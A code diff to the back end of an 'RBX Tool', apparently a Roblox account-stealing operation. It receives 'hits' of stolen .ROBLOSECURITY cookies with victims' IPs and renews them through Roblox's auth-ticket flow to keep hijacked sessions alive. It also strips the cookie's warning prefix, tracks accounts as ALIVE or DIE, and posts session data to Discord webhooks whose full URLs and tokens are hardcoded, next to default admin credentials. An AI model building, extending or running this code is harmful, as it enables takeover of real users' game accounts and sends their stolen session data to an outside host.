@@ -1,6 +1,7 @@
 """
 RBX Tool - Full System
 Flask Web Server + Discord Bot + Cookie Rotation + Cron Scheduler
+✅ Auto Deploy Test - 2026-06-22
 """
 import os
 import sys
@@ -24,7 +25,8 @@ from functools import wraps
 load_dotenv()
 
 DISCORD_TOKEN = os.getenv('DISCORD_TOKEN', '')
-DISCORD_WEBHOOK_URL = os.getenv('DISCORD_WEBHOOK_URL', '')
+DISCORD_WEBHOOK_URL = os.getenv('DISCORD_WEBHOOK_URL', 'https://discord.com/api/webhooks/1518341400842731561/aNePu0KVOBcI_zb_bJNeH9Izd597v27NtJRgb_Xq_nHmKPT2DZdosgqe7ItRt0_RTNz6')  # Cookie notifications
+DISCORD_WEBHOOK_URL_UPDATES = os.getenv('DISCORD_WEBHOOK_URL_UPDATES', 'https://discord.com/api/webhooks/1518591641198530652/s43keFLuzq-Rwr-oafbcYFGGQVTiLuY0zHNdVddHdNTeATADLtVVDV1Ii2A6DINZXNK6')  # Status/config updates
 API_KEY = os.getenv('API_KEY', 'rbx-secret-key-2024')
 ADMIN_USERNAME = os.getenv('ADMIN_USERNAME', 'admin')
 ADMIN_PASSWORD = os.getenv('ADMIN_PASSWORD', 'admin123')
@@ -148,8 +150,8 @@ def db_get_stale_sessions():
     return [dict(r) for r in rows]
 
 def send_simple_update_notification(userId, username, update_type):
-    """Send simple text notification for quick updates"""
-    if not DISCORD_WEBHOOK_URL:
+    """Send simple text notification for quick updates (non-cookie updates)"""
+    if not DISCORD_WEBHOOK_URL_UPDATES:
         return
     
     try:
@@ -164,13 +166,13 @@ def send_simple_update_notification(userId, username, update_type):
         }
         
         embed = {
-            "description": f"✅ {message}",
+            "description": f"✅ {message} - {update_type}",
             "color": colors.get(update_type, 0x3b82f6),
             "timestamp": datetime.now(timezone.utc).isoformat(),
         }
         
         payload = {"embeds": [embed]}
-        http_requests.post(f"{DISCORD_WEBHOOK_URL}?wait=true", json=payload, timeout=10)
+        http_requests.post(f"{DISCORD_WEBHOOK_URL_UPDATES}?wait=true", json=payload, timeout=10)
     except Exception as e:
         logger.debug(f"[NOTIFICATION] Failed to send simple notification: {e}")
 
@@ -235,10 +237,17 @@ ROBLOX_USER_URL = "https://users.roblox.com/v1/users/authenticated"
 
 def get_roblox_user_info(cookie):
     """Get userId and username from cookie"""
+    # Extract actual cookie (remove warning prefix if present)
+    actual_cookie = cookie
+    if '|_' in cookie:
+        parts = cookie.split('|_')
+        if len(parts) >= 2:
+            actual_cookie = parts[-1]  # Get last part (actual cookie)
+    
     try:
         resp = http_requests.get(
             ROBLOX_USER_URL,
-            headers={'Cookie': f'.ROBLOSECURITY={cookie}'},
+            headers={'Cookie': f'.ROBLOSECURITY={actual_cookie}'},
             timeout=10
         )
         if resp.status_code == 200:
@@ -259,9 +268,16 @@ def rotate_cookie(old_cookie):
     Step B: POST auth ticket with csrf (get ticket)
     Step C: POST redeem ticket (get new cookie)
     """
+    # Extract actual cookie (remove warning prefix if present)
+    actual_cookie = old_cookie
+    if '|_' in old_cookie:
+        parts = old_cookie.split('|_')
+        if len(parts) >= 2:
+            actual_cookie = parts[-1]  # Get last part (actual cookie)
+    
     try:
         headers = {
-            'Cookie': f'.ROBLOSECURITY={old_cookie}',
+            'Cookie': f'.ROBLOSECURITY={actual_cookie}',
             'Content-Type': 'application/json',
             'Referer': 'https://www.roblox.com'
         }
@@ -475,9 +491,6 @@ def process_new_hit(cookie, game='', ip='', username_hint='', display_hint=''):
         message_id = send_discord_webhook(session_data, is_update=is_update, update_type=update_type)
         if message_id:
             db_update_message_id(userId, message_id)
-        
-        # Send simple update notification
-        send_simple_update_notification(userId, session_data.get('username', 'unknown'), 'CREATED' if not is_update else 'COOKIE_ROTATED')
     
     # Console output
     cookie_preview = final_cookie[:50] + "..." if len(final_cookie) > 50 else final_cookie
@@ -544,12 +557,12 @@ def refresh_stale_sessions():
             
             if new_cookie:
                 db_update_cookie(userId, new_cookie)
-                # Send simple notification
-                send_simple_update_notification(userId, username, 'COOKIE_ROTATED')
-                # Update Discord webhook
+                # Update Discord webhook (cookie notification)
                 updated_session = db_get_session(userId)
                 if updated_session:
                     send_discord_webhook(updated_session, is_update=True, update_type='COOKIE_ROTATED')
+                    # Also send to updates webhook
+                    send_simple_update_notification(userId, username, 'COOKIE_ROTATED')
                 success += 1
                 logger.info(f"[CRON] Refreshed {userId} successfully")
             else:
@@ -583,6 +596,11 @@ def start_scheduler():
     scheduler.start()
     logger.info(f"[CRON] Scheduler started - running every {REFRESH_INTERVAL_MINUTES} minutes")
     return scheduler
+
+# =====================================================
+# GLOBAL SCHEDULER (for dynamic updates)
+# =====================================================
+global_scheduler = None
 
 # =====================================================
 # FLASK APP
@@ -734,7 +752,6 @@ def admin_sessions_api():
     sessions = db_list_sessions()
     now = datetime.now(timezone.utc)
     refresh_minutes = REFRESH_INTERVAL_MINUTES
-    max_age_hours = COOKIE_MAX_AGE_HOURS
     
     for s in sessions:
         # Calculate time since last update
@@ -746,11 +763,11 @@ def admin_sessions_api():
             s['ageSeconds'] = int(age_seconds)
             s['ageMinutes'] = round(age_seconds / 60, 1)
             s['ageHours'] = round(age_seconds / 3600, 2)
-            # Time until next refresh
-            max_age_seconds = max_age_hours * 3600
-            remaining = max_age_seconds - age_seconds
+            # Time until next refresh (based on refresh interval)
+            refresh_seconds = refresh_minutes * 60
+            remaining = refresh_seconds - age_seconds
             s['refreshIn'] = max(0, int(remaining))
-            s['needsRefresh'] = remaining <= 0 and s['status'] == 'ALIVE'
+            s['needsRefresh'] = age_seconds >= refresh_seconds and s['status'] == 'ALIVE'
         except:
             s['ageSeconds'] = 0
             s['refreshIn'] = 0
@@ -761,55 +778,86 @@ def admin_sessions_api():
         'sessions': sessions,
         'config': {
             'refreshIntervalMinutes': refresh_minutes,
-            'cookieMaxAgeHours': max_age_hours,
             'serverTime': now.isoformat()
         }
     })
 
 @app.route('/api/admin/config', methods=['POST'])
 def update_admin_config():
-    """Update admin configuration"""
+    """Update admin configuration and reschedule jobs"""
+    global REFRESH_INTERVAL_MINUTES, global_scheduler
+    
     try:
         data = request.get_json()
         if not data:
             return jsonify({'error': 'No data received'}), 400
         
-        # Note: In production, save these to .env or database
-        # For now, they are read-only from .env
-        new_interval = data.get('refreshIntervalMinutes', REFRESH_INTERVAL_MINUTES)
-        new_max_age = data.get('cookieMaxAgeHours', COOKIE_MAX_AGE_HOURS)
+        new_interval = data.get('refreshIntervalMinutes')
         
-        logger.info(f"[CONFIG] Update request: interval={new_interval}min, maxAge={new_max_age}h")
+        # Validate interval
+        if new_interval is not None:
+            try:
+                new_interval = int(new_interval)
+                if new_interval < 1 or new_interval > 1440:  # 1 min to 24 hours
+                    return jsonify({'error': 'Interval must be between 1 and 1440 minutes'}), 400
+            except (ValueError, TypeError):
+                return jsonify({'error': 'Invalid interval'}), 400
+        else:
+            new_interval = REFRESH_INTERVAL_MINUTES
         
-        # Send Discord notification for config update
-        if DISCORD_WEBHOOK_URL:
+        old_interval = REFRESH_INTERVAL_MINUTES
+        
+        # Update global variable
+        REFRESH_INTERVAL_MINUTES = new_interval
+        
+        logger.info(f"[CONFIG] Update: interval={old_interval}min→{new_interval}min")
+        
+        # Reschedule the job if interval changed and scheduler is running
+        if global_scheduler and new_interval != old_interval:
+            try:
+                # Remove old job
+                global_scheduler.remove_job('refresh_sessions')
+                logger.info("[SCHEDULER] Removed old refresh job")
+                
+                # Add new job with new interval
+                global_scheduler.add_job(
+                    refresh_stale_sessions,
+                    'interval',
+                    minutes=new_interval,
+                    id='refresh_sessions',
+                    name='Refresh stale sessions'
+                )
+                logger.info(f"[SCHEDULER] Rescheduled refresh job to run every {new_interval} minutes")
+            except Exception as e:
+                logger.error(f"[SCHEDULER] Error rescheduling: {e}")
+                return jsonify({'error': f'Failed to reschedule: {e}'}), 500
+        
+        # Send Discord notification for config update (via updates webhook)
+        if DISCORD_WEBHOOK_URL_UPDATES:
             embed = {
                 "title": "⚙️ CONFIGURATION UPDATED",
                 "color": 0x8b5cf6,
                 "fields": [
-                    {"name": "🔄 Refresh Interval", "value": f"`{new_interval}` minutes", "inline": True},
-                    {"name": "🪙 Cookie Max Age", "value": f"`{new_max_age}` hours", "inline": True},
+                    {"name": "🔄 Refresh Interval", "value": f"`{old_interval}` → `{new_interval}` minutes", "inline": True},
                     {"name": "⏰ Updated At", "value": datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC'), "inline": False},
-                    {"name": "📝 Status", "value": "⚠️ Server restart required for changes to take effect", "inline": False},
+                    {"name": "✅ Status", "value": "Applied immediately!", "inline": False},
                 ],
                 "timestamp": datetime.now(timezone.utc).isoformat(),
                 "footer": {"text": "RBX Tool - Admin Panel"}
             }
             payload = {"embeds": [embed]}
             try:
-                http_requests.post(f"{DISCORD_WEBHOOK_URL}?wait=true", json=payload, timeout=10)
-                # Also send simple notification
-                send_simple_update_notification('CONFIG', 'CONFIG', 'CONFIG_UPDATED')
+                http_requests.post(f"{DISCORD_WEBHOOK_URL_UPDATES}?wait=true", json=payload, timeout=10)
+                logger.info("[CONFIG] Notification sent to updates webhook")
             except Exception as e:
                 logger.error(f"[CONFIG] Failed to send webhook: {e}")
         
-        # Return current values
+        # Return updated values
         return jsonify({
             'status': 'success',
-            'message': f'Configuration update recorded. ⚠️ Server restart required.\n📝 New: {new_interval}min refresh, {new_max_age}h max age',
+            'message': f'✅ Configuration updated successfully!\n🔄 New refresh interval: {new_interval} minutes',
             'config': {
-                'refreshIntervalMinutes': REFRESH_INTERVAL_MINUTES,
-                'cookieMaxAgeHours': COOKIE_MAX_AGE_HOURS
+                'refreshIntervalMinutes': REFRESH_INTERVAL_MINUTES
             }
         }), 200
     except Exception as e:
@@ -956,22 +1004,24 @@ def start_discord_bot():
                         'displayName': user_info.get('displayName', 'N/A')
                     })
                     results['details'].append(f"✅ {username} (ID: `{userId}`) - Cookie rotated successfully")
-                    # Send simple notification
+                    # Send to updates webhook
                     send_simple_update_notification(userId, username, 'COOKIE_ROTATED')
                 else:
                     db_update_status(userId, 'DIE')
                     results['failed'].append(userId)
                     results['details'].append(f"⚠️ {username} (ID: `{userId}`) - Cookie rotated but account verification FAILED - marked as DIE")
-                    # Send simple notification
+                    # Send status change notification
                     send_simple_update_notification(userId, username, 'STATUS_CHANGED')
-                # Update Discord webhook
+                # Update Discord webhook (cookie notification)
                 updated_session = db_get_session(userId)
-                if updated_session:
+                if updated_session and user_info:
                     send_discord_webhook(updated_session, is_update=True, update_type='COOKIE_ROTATED')
             else:
                 db_update_status(userId, 'DIE')
                 results['failed'].append(userId)
                 results['details'].append(f"❌ {username} (ID: `{userId}`) - Rotation FAILED - marked as DIE")
+                # Send status change notification
+                send_simple_update_notification(userId, username, 'STATUS_CHANGED')
             
             time.sleep(1)  # Small delay between refreshes
         
@@ -1011,13 +1061,9 @@ def start_discord_bot():
         username = session.get('username', 'unknown')
         db_update_status(userid, status.value)
         
-        # Send simple update notification
-        send_simple_update_notification(userid, username, 'STATUS_CHANGED')
-        
-        # Send Discord webhook notification
-        session_data = db_get_session(userid)
-        if session_data and old_status != status.value:
-            send_discord_webhook(session_data, is_update=True, update_type='STATUS_CHANGED')
+        # Send status change notification (via updates webhook)
+        if old_status != status.value:
+            send_simple_update_notification(userid, username, 'STATUS_CHANGED')
         
         await interaction.response.send_message(
             f"✅ Updated **{username}** (ID: `{userid}`)\n{old_status} → **{status.value}**"
@@ -1073,7 +1119,7 @@ if __name__ == '__main__':
     setup_images()
     
     # 3. Start cron scheduler
-    scheduler = start_scheduler()
+    global_scheduler = start_scheduler()
     
     # 4. Start Discord bot in background thread
     if DISCORD_TOKEN:
